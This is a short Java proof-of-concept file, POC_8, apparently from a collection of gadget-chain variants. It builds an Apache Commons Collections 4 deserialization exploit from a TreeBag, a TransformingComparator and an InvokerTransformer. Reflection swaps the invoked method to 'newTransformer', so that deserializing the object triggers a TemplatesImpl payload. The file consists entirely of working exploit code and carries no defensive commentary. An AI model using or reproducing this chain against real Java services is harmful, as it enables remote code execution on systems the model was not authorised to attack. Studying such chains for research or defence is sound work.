package com.example.CC4;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import com.example.Utils.Share;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

public class POC_8 {

    public static void main(String[] args) throws Exception {
        TemplatesImpl tmpl = Share.getTemplatesImplObj();

        Transformer transformer = new InvokerTransformer("toString", new Class[]{}, new Object[]{});
        TransformingComparator comparator  = new TransformingComparator(transformer);

        TreeBag tree = new TreeBag(comparator);
        tree.add(tmpl);

        ReflectionUtil.setField(transformer, "iMethodName", "newTransformer");

        SerializeUtil.deserialize(SerializeUtil.serialize(tree));
    }

}
